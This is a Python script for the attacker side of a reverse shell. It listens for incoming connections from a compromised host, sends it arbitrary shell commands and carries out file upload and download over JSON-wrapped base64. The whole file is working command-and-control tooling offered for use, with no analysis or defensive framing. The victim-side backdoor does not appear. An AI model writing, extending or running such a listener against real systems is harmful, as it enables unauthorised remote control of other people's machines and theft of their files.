import socket
import json
import random
import base64
import argparse


class Listener:
    def __init__(self):
        arguments = self.get_arguments()
        ip = arguments.ip
        port = arguments.port
        self.build_connection(ip, port)

    def build_connection(self, ip, port):
        # creates a socket (pipe connection)
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # bypass time_wait, make the connection immediately reusable
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, int(port)))  # To listen on
        print("[+] Waiting for connections...")
        # listens for connection # (backlog) - Max number of queued connections
        listener.listen(0)
        # .accept returns socket(connection) object and client address
        self.connection, address = listener.accept()
        print(f"[+] Connection established with {address[0]}")

    def get_arguments(self):
        # Creates script switches and help document page
        parser = argparse.ArgumentParser()
        parser.add_argument("-i", "--ipaddress", dest="ip",
                            help="Listener's ip address")
        parser.add_argument("-p", "--port", dest="port",
                            help="Port to listen on")
        arguments = parser.parse_args()

        # Error handling!
        if not arguments.ip:
            print("[-] Required 'ip' argument missing!")
            exit()
        elif not arguments.port:
            print("[-] Required 'port' argument missing!")
            exit()
        return arguments

    def reliable_send(self, cmd):
        try:
            cmd = cmd.decode('utf-8')
            json_data = json.dumps(cmd)
        except AttributeError:
            json_data = json.dumps(cmd)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_recv(self):
        json_r_data = ""
        while True:
            try:
                json_r_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_r_data)
            except json.decoder.JSONDecodeError:
                print("[+] Processing..." +
                      random.choice("/\\[]{}+-"), end="\r")
                continue

    def execute_cmds(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            print("\n[!] Session terminated with 'exit'\n")
            self.connection.close()
            exit()

        return self.reliable_recv()

    def read_file(self, filename):
        try:
            with open(filename, "rb") as file:
                return base64.b64encode(file.read())
        except FileNotFoundError:
            return "Error: No such file: " + filename

    def write_file(self, filename, content):  # Copy the contents of the download file
        content_list = content.split(" ")
        if not content_list[0] == "Error:":
            with open(filename, "wb") as file:
                # Converting content to bytes
                content = content.encode('utf-8')
                file.write(base64.b64decode(content))  # Decoding base64 format
                return f"Successfully downloaded: {filename}"
        return content

    def upload_file(self, cmd):
        file_content = self.read_file(cmd[1])
        try:
            file_content = file_content.decode()
            cmd.append(file_content)
        except AttributeError:
            cmd.append(file_content)
        return cmd

    def start(self):
        while True:
            cmd = input(">>")
            cmd = cmd.split(" ")  # convert input into a list

            if cmd[0] == "upload":
                cmd = self.upload_file(cmd)

            result = self.execute_cmds(cmd)

            if cmd[0] == "download":
                result = self.write_file(cmd[1], result)

            print(result)


my_listener = Listener()
my_listener.start()
